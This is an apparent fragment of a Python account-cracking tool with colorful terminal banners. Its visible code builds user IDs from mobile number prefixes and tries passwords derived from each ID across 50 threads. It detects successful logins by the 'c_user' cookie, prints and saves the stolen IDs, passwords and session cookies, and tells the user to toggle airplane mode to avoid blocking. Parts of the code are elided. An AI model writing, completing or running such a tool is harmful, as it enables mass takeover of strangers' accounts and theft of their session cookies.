...
\033[1;39m     ┃ \x1b[1;95m❣︎[𖣘]☔︎\x1b[1;96m𝙏𝙊𝙊𝙇𝙎 𝙎𝙏𝘼𝙏𝙐𝙎\033[1;34m: [★]𝗙𝗥𝗘𝗘-𝗩𝟭\033[1;39m            ┃
...
try:
    print(' \033[1;30m[\033[1;92m🌺\033[1;30m]\033[1;92m Loading To Next...')
    time.sleep(3)
    v = 5.2
    update = ('5.2')
    update = ('5.2')
...
def ck():
    ...
    os.system("clear")
    print(logo)
    print(' \033[1;30m[\033[1;92m🍂\033[1;30m]\033[1;93m Example \033[1;32m⫸\033[1;92m 0171 \033[1;91m⫸\033[1;92m 0175 \033[1;91m⫸\033[1;92m 92302 \033[1;91m⫸\033[1;92m 92301 \033[1;91m◀︎')
    print('\033[1;94m⊰᯽⊱┈──╌❊⊰᯽⊱┈──╌❊⊰᯽⊱┈──╌❊⊰᯽⊱┈──╌❊⊰᯽⊱┈──╌❊⊰᯽⊱┈──╌❊')
    code = input('\n \033[1;30m[\033[1;92m🍂\033[1;30m]\033[1;93m Choose \033[1;91m>>\033[1;92m ')
    limit = 50000
    ...
    with ThreadPool(max_workers=50) as manshera:
        clear()
        tl = str(len(user))
        print(' \033[1;30m[\033[1;92m🥳\033[1;30m]\033[1;92m YOUR SLECTED SIM \033[1;91m◀︎◀︎\033[1;96m '+code)
        print(' \033[1;30m[\033[1;92m🥳\033[1;30m]\033[1;92m TOTAL IDS \033[1;91m▶︎▶︎\033[1;93m '+tl)
        print(' \033[1;30m[\033[1;92m🥳\033[1;30m]\033[1;92m THE PROCESS HAS BEEN STARTED')
        print(' \033[1;30m[\033[1;92m🥳\033[1;30m]\x1b[38;5;208m USE AEROPLANE MOOD IN EVERY 5 MIN ')
        print('\033[1;94m⊰᯽⊱┈──╌❊⊰᯽⊱┈──╌❊⊰᯽⊱┈──╌❊⊰᯽⊱┈──╌❊⊰᯽⊱┈──╌❊⊰᯽⊱┈──╌❊')
        for love in user:
            pwx = [love[1:]]
            uid = code+love
    ...
    print('\n\033[1;94m⊰᯽⊱┈──╌❊⊰᯽⊱┈──╌❊⊰᯽⊱┈──╌❊⊰᯽⊱┈──╌❊⊰᯽⊱┈──╌❊⊰᯽⊱┈──╌❊')
    print(' \033[1;30m[\033[1;92m🥳\033[1;30m]\033[1;92m Crack process has been completed')
    print(' \033[1;30m[\033[1;92m🥳\033[1;30m]\033[1;92m Ids saved in ck/ok.txt,ck/cp.txt')
    print('\033[1;94m⊰᯽⊱┈──╌❊⊰᯽⊱┈──╌❊⊰᯽⊱┈──╌❊⊰᯽⊱┈──╌❊⊰᯽⊱┈──╌❊⊰᯽⊱┈──╌❊')
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[65:80]
                print(' \n\033[1;97m[\033[1;92m𝗞𝗜𝗡𝗚-OK🍇🌻🍗😈\033[1;97m]\033[1;92m ' +uid+ '\033[1;91m◀︎▶︎\033[1;92m' +ps+ '\n \033[1;91m[\033[1;92m🍓\033[1;91m]\033[1;92m COOKIES💥 \033[1;91m=\x1b[38;5;126m '+coki+'')                
                ...
                continue
        loop+=1
        sys.stdout.write('\r \033[1;91m[\033[1;97m𝗞𝗜𝗡𝗚🍒🍅🌺🥭\033[1;91m][\033[1;97m%s\033[1;91m][\033[1;92mOK-%s\033[1;91m]'%(loop,len(oks)))
        sys.stdout.flush()
    except:
        pass
print(logo)
...
if password in ["Black","black","BLACK"]:
    pass
if password not in ["Black","black","BLACK"]:
    os.system("clear")
    print("Enter the R8 password ")
    sys.exit()                
ck()
